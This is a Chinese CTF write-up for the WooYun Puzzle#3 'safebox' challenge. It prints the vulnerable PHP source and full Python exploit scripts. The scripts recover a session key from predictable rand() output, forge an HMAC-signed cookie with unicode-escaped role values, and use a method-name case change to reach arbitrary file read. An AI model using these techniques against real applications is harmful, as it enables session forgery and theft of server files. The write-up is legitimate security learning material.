---
title:  "不插电 · WooYun Puzzle#3 Write up"
date:   2016-06-28 12:00:00
---

# 0x00 前言

---

先献上flag，以表正义（我有一颗世界和平的心）

>Congratulate you, flag is cb6afe419450c23f462159afb9976130

很高兴能够参加这次WooYun Puzzle，从P师傅出的题目中学到些许东西，下面分三步来突破[安全盒子的秘密](http://0dac0a717c3cf340e.jie.sangebaimao.com:82/)

# 0x01 引诱

---

题目伊始上来一个“安全盒子”，不清楚具体是什么鬼，先随便提交试试

![][1]

提交后报错说权限拒绝，向这种摸不着头脑的猜测会有源码来告诉你具体逻辑，F12后发现访问源码方法`<!-- ?x_show_source -->`：

![][2]

随机访问`http://0dac0a717c3cf340e.jie.sangebaimao.com:82/?x_show_source`后得到源码为：

{% highlight php %}
<?php
/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 16/6/8
 * Time: 上午12:24
 */ 

//控制报错显示源码
error_reporting(-1);
ini_set("display_errors", 1);
if(isset($_GET['x_show_source'])) {
    show_source(__FILE__);
    exit;
}   

//为每次会话开启session
session_start();

//根据rand_str()生成6位SECRET_KEY和16位CSRF_TOKEN
if(empty($_SESSION['SECRET_KEY'])) {
    $_SESSION['SECRET_KEY'] = rand_str(6);
}
if(empty($_SESSION['CSRF_TOKEN'])) {
    $_SESSION['CSRF_TOKEN'] = rand_str(16);
}   

//包含点，其中可能存在flag
include_once "flag.php";    

//使用rand()函数随机生成指定长度字符串
function rand_str($length = 16)
{
    $rand = [];
    $_str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    for($i = 0; $i < $length; $i++) {
        $n = rand(0, strlen($_str) - 1);
        $rand[] = $_str{$n};
    }
    return implode($rand);
}   

//对ajax的请求以json形式相应，否则直接转换成字符串输出
function output($obj)
{
    if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strcasecmp($_SERVER['HTTP_X_REQUESTED_WITH'], 'XMLHttpRequest') === 0) {
        header("Content-Type: application/json");
        echo json_encode($obj);
    } else {
        header("Content-Type: text/html; charset=UTF-8");
        echo strval($obj);
    }
}   

//每次提交check之后，将CSRF_TOKEN置为null
function check_csrf_token()
{
    if(empty($_SESSION['CSRF_TOKEN']) || $_POST['CSRF_TOKEN'] !== $_SESSION['CSRF_TOKEN']) {
        return false;
    } else {
        $_SESSION['CSRF_TOKEN'] = null;
        return true;
    }
}   

//显示form页面
function show_form_page()
{
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>safebox</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>  

    <div class="container">
        <form method="post">
        <div class="block title">
            安全箱子
        </div>
        <div class="block show">
            <div class="line">
                <label>输入验证字符串: </label>
                <input type="text" name="key">
            </div>
            <div class="line">
                <label>输入方法　　　: </label>
                <input type="text" name="act">
            </div>
        </div>
        <div class="block info">
            <input type="reset" value="重置">
            <input name="submit" type="submit" value="提交">
            <input type="hidden" name="CSRF_TOKEN" value="<?php echo $_SESSION['CSRF_TOKEN'] ?>">
        </div>
        </form>
    </div>  

    </body>
    </html>
    <?php
}   

//显示报错页面
function show_error_page($msg)
{
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Error</title>
        <link rel="stylesheet" href="style.css">
        <!-- ?x_show_source -->
    </head>
    <body>  

    <div class="container">
        <div class="block title">
            Error
        </div>
        <div class="block show">
            <?php echo $msg; ?>
        </div>
        <div class="block info">
            <a href="javascript:history.back(-1)">返回</a>
        </div>
    </div>  

    </body>
    </html>
    <?php
    exit;
}   

$act = isset($_POST['act']) ? $_POST['act'] : "";
$key = isset($_POST['key']) ? $_POST['key'] : "";
if(isset($_POST['submit']) && check_csrf_token()) {                 //csrf_token校验
    if(hash_hmac('md5', $act, $_SESSION['SECRET_KEY']) === $key) {  //hmac_md5校验
        if(function_exists($act)) {                                 //函数存在性校验
            $exec_res = $act();                                     //调用指定函数
            output($exec_res);                                      //输出函数返回结果
        } else {
            show_error_page("Function not found!!");
        }
    } else {
        show_error_page("Permission deny!!");
    }
} else {
    show_form_page();
}
{% endhighlight %}

所以重点在与最后的指定函数调用，分析如下：

1. csrf_token校验：这里保证了提交的crsf_token的正确性，但小白我没有看出存在csrf的场景，token略显可疑
2. hmac_md5校验：对于[HMAC-MD5](http://www.cnblogs.com/soundcode/p/3802344.html)，自认为算法上不存在什么缺陷，又是`===`进行判断，就使得我们必须知道`$_SESSION['SECRET_KEY']`的确切值，才能进入之后的if逻辑
3. 函数存在性校验：先检验载调用函数，而这里具有利用价值的估计就是包含在flag.php中的函数了
4. 调用指定函数：无参数传递，感觉会是个小坑哈
5. 输出函数返回结果：两种输出方式二选其一，猜测作者这里也另有目的

在程序中，对于每一个session都会先生成6位SECRET_KEY保持不变，在每次提交后对16位的CSRF_TOKEN进行变化。要知道SECRET_KEY的确切值，我首先想到的是暴力破解，虽然62**6不是太大，可是后续的套具体还不知道，而且出题人也不会这么无聊，尝试了一下就放弃了这个想法。既然不能猜那就预测呗，我的痛苦经历让我想到了一次CTF的rand()预测题目，具体原理与题目可见：

* <http://www.freebuf.com/articles/web/99093.html>
* <http://www.mscs.dal.ca/~selinger/random/>

有没感觉很像，CTF题目中是多次输出rand()的值，再结合其生成算法，根据其之前生成的值预测之后的值：

{% highlight bash %}
O_31 = O_0 + O_28 mod 2**31
O_32 = O_1 + O_29 mod 2**31
O_33 = O_2 + O_30 mod 2**31
O_34 = O_3 + O_31 mod 2**31 
O_35 = O_4 + O_32 mod 2**31
O_36 = O_5 + O_33 mod 2**31
{% endhighlight %}

而我们这里呢，是每次提交后CSRF_TOKEN都会变化，而token中的字符根据对应关系也就是由rand()生成的值。但他们是向后预测，我们好像是向前推理，那该怎么办呢？加法会减法就不会啦?！

{% highlight bash %}
O_0 = O_31 - O_28 mod 2**31
...
O_5 = O_36 - O_33 mod 2**31
{% endhighlight %}

可是我们这里的rand()是有范围的那该如何呢，[搜一搜](https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=php%20rand%20source%20code)翻出对应的[源码](https://github.com/php/php-src/blob/PHP-5.6.21/ext/standard/rand.c)即可找到答案：

![][3]

![][4]

对于`n' = a + n(b-a+1)/(M+1)`，我们先令a=0,b=61化简成`n' = 62n/(M+1)`,把运算用于整个公式，我再偷一下懒最后使用`(o[31+i]+62-o[28+i])%62`来推算前6位的SECRET_KEY，初步代码（new-1.py）如下：

{% highlight python %}
import re
import requests
import hmac
import sys
reload(sys)
sys.setdefaultencoding('utf-8') 

url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
session = requests.session()
str_list = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
re_csrf_token = r'(?<=value=").*?(?=")'
action = sys.argv[1]    

def parse(token,s):
    d = []
    for i in xrange(len(token)):
        for j in xrange(len(s)):
            if token[i] == s[j]:
                d.append(j)
                break
    return d    

def guess(d,s,a):
    result = []
    for i in xrange(6):
        r = (d[31+i]+62-d[28+i])%62
        result.append(r)
    key = ''.join(s[j] for j in result) 

    return hmac.new(key,a).hexdigest()  

r0 = session.get(url)
token0 = re.findall(re_csrf_token,r0.text)[-1]
d0 = parse(token0,str_list)
payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
session.post(url,data=payload0)
r1 = session.get(url)
token1 = re.findall(re_csrf_token,r1.text)[-1]
d1 = parse(token1,str_list)
pre =  [0,0,0,0,0,0]+d0+d1
key = guess(pre,str_list,action)
payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'key':key}
r2 = session.post(url,data=payload1)    

if 'Permission deny!!' not in r2.text:
    print '[+]Done!'
    print r2.text
{% endhighlight %}

由于rand生成算法中有加1的随机情况存在，所以这里就需要多推测几次得到正确的SECRET_KEY，进入if逻辑调用函数，所以再写一个初步的代码（get-1.py）重复测试

{% highlight python %}
#!/usr/bin/env python
#coding=utf-8   

import sys
import subprocess   

while 1:
    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2]])
    if output:
        print output
        break
{% endhighlight %}

运行得到如下输出：

{% highlight bash %}
$ python get-1.py new-1.py flag
[+]Done!
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Error</title>
        <link rel="stylesheet" href="style.css">
        <!-- ?x_show_source -->
    </head>
    <body>  

    <div class="container">
        <div class="block title">
            Error
        </div>
        <div class="block show">
            Function not found!!        </div>
        <div class="block info">
            <a href="javascript:history.back(-1)">返回</a>
        </div>
    </div>  

    </body>
    </html>
{% endhighlight %}

显然我这样瞎猜函数不会是个头，那就必须知道flag.php中是否有函数可供我们利用呢，所以我们就得知道哪些函数可以查看当前脚本中定义的函数，变量，常量等信息，百度一下你就知道：[PHP输出当前进程所有变量/常量/模块/函数/类的示例](http://www.jb51.net/article/42890.htm)，正好还都是不需要参数的。我首先利用get_defined_vars()和get_defined_constants()看看能不能直接脱出flag变量或者常量，然而并没有我想象的那么简单。那就用get_defined_functions看看吧：

{% highlight bash %}
$ python get-1.py new-1.py get_defined_functions
[+]Done!
<br />
<b>Notice</b>:  Array to string conversion in <b>/app/index.php</b> on line <b>45</b><br />
Array
{% endhighlight %}

这里函数的结果是个数组，而strval()对数组的变换同一是"Array"。那就试试让其用json响应呗，根据[stackoverflow](http://stackoverflow.com/questions/28610376/sending-an-jquery-ajax-get-request-with-python-request-library)上大神的回答，我们加个`'X-Requested-With': 'XMLHttpRequest'`的header就好了，输出如下（有省略）：

{% highlight bash %}
$ python get-1.py new-1.py get_defined_functions
[+]Done!
{"internal":["zend_version",...],"user":["rand_str","output","check_csrf_token","show_form_page","show_error_page","_fd_init","fd_show_source","fd_config","fd_error","fg_safebox"]}
{% endhighlight %}

主要关注的是最后一个数组中用户定义的函数，哎呦，有个fd_show_source的函数，试试没准flag就出来了。

# 0x02 绕过

---

事情并没有我们想象的那么简单，看来是作者又给我们下了一个套，fd_show_source函数输出整理如下（已加个人注解）：

{% highlight php %}
<?php
/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 16/6/8
 * Time: 上午12:24
 */ 

class SafeBox { 

    //貌似可产生任意文件读取
    private function _read_file($filename)
    {
        $filename = dirname(__FILE__) . "/" . $filename;
        return file($filename);
    }   

    //通过POST filename可读取任意文件
    public function read()
    {
        $filename = isset($_POST['filename']) ? $_POST['filename'] : "box.txt";
        return $this->_read_file($filename);
    }   

    public function view()
    {
        $lines = $this->_read_file('box.txt');
        $i = isset($_POST['i']) ? intval($_POST['i']) : 0;
        return isset($lines[$i]) ? $lines[$i] : "None";
    }   

    public function alist()
    {
        $lines = $this->_read_file('box.txt');
        return $lines;
    }   

    public function random()
    {
        $lines = $this->_read_file('box.txt');
        return $lines[array_rand($lines)];
    }
}   

function _fd_init()
{
    //定义role必须为guest
    $_SESSION["userinfo"] = [
        "role" => "guest"
    ];                                                                                  //初始化role为guest
    $cookie = isset($_COOKIE['userinfo']) ? base64_decode($_COOKIE['userinfo']) : "";   //base64解码cookie userinfo
    if(empty($cookie) || strlen($cookie) < 32) {
        return false;
    }   

    $h1 = substr($cookie, 0, 32);                                                       //前32位为h1
    $h2 = substr($cookie, 32);                                                          //后32位为h2
    if($h1 !== hash_hmac("md5", $h2, $_SESSION['SECRET_KEY'])) {                        //再次hamc_md5校验(1)
        return false;
    }   

    //防止身份伪造
    if(strpos($h2, "admin") !== false || strpos($h2, "user") !== false) {               //防止h2中出现"admin"和"user"(2)
        return false;
    }
    $s = json_decode($h2, true);                                                        //json解码h2，并转换成数组
    $s['role'] = strval($s['role']);                                                    //$s['role']转为字符串(3)
    if($s['role'] == 'admin') {                                                         //再次进行身份对比
        return false;
    }
    $_SESSION["userinfo"] = array_merge($_SESSION["userinfo"], $s);                     //用h2中的role替换session中userinfo的role
    return true;
}   

function fd_show_source()
{
    return file_get_contents(__FILE__);
}   

//包含config.php 其中可能有flag？
function fd_config()
{
    return include_once __DIR__ . "/config.php";
}   

function fd_error($msg)
{
    return "Error: {$msg}";
}   

function fg_safebox()
{
    _fd_init();                                                                         //初始化
    $config = fd_config();
    $action = isset($_POST['method']) ? $_POST['method'] : "";                          //指定action
    $role = isset($_SESSION["userinfo"]['role']) ? $_SESSION["userinfo"]['role'] : "";
    if(!in_array($role, ['admin', 'user'])) {                                           //判断是否具有权限(1)
        return fd_error('Permission denied!!');
    }
    if(in_array($action, $config['role']['admin']) && $role != "admin") {               //判读行为权限(2)
        return fd_error('Admin permission denied!!');
    }
    $box = new SafeBox();
    if(method_exists($box, $action)) {                                                  //判断对象方法是否存在(3)
        return call_user_func([$box, $action]);                                         //调用相应方法(4)
    } else {
        return null;
    }
}
{% endhighlight %}

首先在初始化_fd_init()中，要点分析如下：

1. 再次hamc_md5校验：这里的校验好说，毕竟`SECRET_KEY`已经知晓，带上个`h1`就好
2. 防止h2中出现"admin"和"user"：这里使用了strpos来查看字符串中是否存在身份伪造，而且使用`！==`很规范，从源码基本也没看出什么破绽
3. $s['role']转为字符串：strval会将数组类型变得没有意义，也就想不出办法绕过对"admin"身份的检验

在fg_safebox()中第一关就是要判断其身份，要求其为"admin"或"user"。结合以上的分析，admin的两次检验我是绕不过去了我认了。所以就开始琢磨能不能使最终的`$role`为"user",而strpos约束我们在$h2中不能出现"user",要不然我们编码试试？哈哈，这里的`$s = json_decode($h2, true);`就是等着我们利用的，可以将"user"进行unicode编码成为`\u0075\u0073\u0065\u0072`,这样在strpos中就不会检验出来，而且经过json_decode最终还原成"user"。

在(2)判读行为权限中，加入$box对象的read方法不在$config['role']['admin']数组内，那么就不会判断`$role != "admin"`，进而产生绕过。我们再修改一下原先的代码（new-2.py）如下：

{% highlight python %}
import re
import requests
import hmac
import base64
import sys
reload(sys)
sys.setdefaultencoding('utf-8') 

url = "http://0dac0a717c3cf340e.jie.sangebaimao.com:82/"
session = requests.session()
str_list = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
re_csrf_token = r'(?<=value=").*?(?=")'
header = {'X-Requested-With': 'XMLHttpRequest'}
action = sys.argv[1]
method = sys.argv[2]    

def parse(token,s):
    d = []
    for i in xrange(len(token)):
        for j in xrange(len(s)):
            if token[i] == s[j]:
                d.append(j)
                break
    return d    

def guess(d,s,a):
    result = []
    for i in xrange(6):
        r = (d[31+i]+62-d[28+i])%62
        result.append(r)
    key = ''.join(s[j] for j in result) 

    return (key,hmac.new(key,a).hexdigest())    

def create_cookie(k):
    h2 = r'{"role":"\u0075\u0073\u0065\u0072"}'
    h1 = hmac.new(k,h2).hexdigest()
    return {'userinfo':base64.b64encode(h1+h2)} 

r0 = session.get(url)
token0 = re.findall(re_csrf_token,r0.text)[-1]
d0 = parse(token0,str_list)
payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
session.post(url,data=payload0)
r1 = session.get(url)
token1 = re.findall(re_csrf_token,r1.text)[-1]
d1 = parse(token1,str_list)
pre =  [0,0,0,0,0,0]+d0+d1
secret,key = guess(pre,str_list,action)
cookie = create_cookie(secret)
payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'method':method, 'key':key}
r2 = session.post(url,data=payload1,headers=header,cookies=cookie)  

if 'Permission deny!!' not in r2.text:
    print '[+]Done!'
    print r2.text
{% endhighlight %}

相应的get-2.py也简单如下：

{% highlight python %}
#!/usr/bin/env python
#coding=utf-8   

import sys
import subprocess   

while 1:
    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2],sys.argv[3]])
    if output:
        print output
        break
{% endhighlight %}

输出如下：

{% highlight bash %}
$ python get-2.py new-2.py fg_safebox read
[+]Done!
"Error: Admin permission denied!!"
{% endhighlight %}

在简单尝试之后"user"只能调用$box对象的view、alist和view方法，唯独不能使用read方法，如果说一定要用read方法，这里估计也是无法绕过去了。不急，继续往下看看有没有思路，在(4)调用相应方法中，其会和PHP对象有关联，而就我知道的和搜索到的，大多都是PHP对象注入问题，而这里也没有魔术方法和序列化之类的东西，猜测也就不是这个考察点。那么关注的重心就移到了(3)判断对象方法是否存在，在使用method_exists的时候会不会出现什么问题呢，看[源码](https://github.com/php/php-src/blob/f8faffe37edd74e0314f74436825bfcf5be78a49/Zend/zend_builtin_functions.c)之：

![][5]

唉呀妈呀，其中一句`lcname = zend_string_tolower(method_name);`，就猜测这里是先将方法名转成小写再进行判断和利用的。我们这里就可以大小写绕过，使"user"调用的方法为`READ`，进入(4)中的函数调用，加上filename的POST就可以进行任意文件读取啦～

# 0x03 寻找

---

赶紧读读config.php里面有没有什么东西，结果：

{% highlight bash %}
[+]Done!
["<?php\n","\/**\n"," * Created by PhpStorm.\n"," * User: phithon\n"," * Date: 16\/6\/8\n"," * Time: \u4e0a\u534812:24\n"," *\/\n","\n","return [\n","    \"role\" => [\n","        \"admin\" => [\n","            \"read\"\n","        ],\n","        \"user\" => [\n","            \"view\", \"alist\", \"random\"\n","        ]\n","    ]\n","];"]
{% endhighlight %}

看来还是要有点渗透思维去读读配置文件什么的，看看flag到底藏在哪，参考[Linux渗透与提权：技巧总结篇](https://www.91ri.org/7911.html)与[Linux提权后获取敏感信息的方法与途径](https://www.91ri.org/7459.html)，把里面cat的文件全部集中一起，写个脚本跑一遍及可发现flag，代码与之前的类似，详见[github](https://github.com/Larryxi/My_tools/tree/master/puzzle2016)

[1]: /images/20160628/1.png
[2]: /images/20160628/2.png
[3]: /images/20160628/3.png
[4]: /images/20160628/4.png
[5]: /images/20160628/5.png

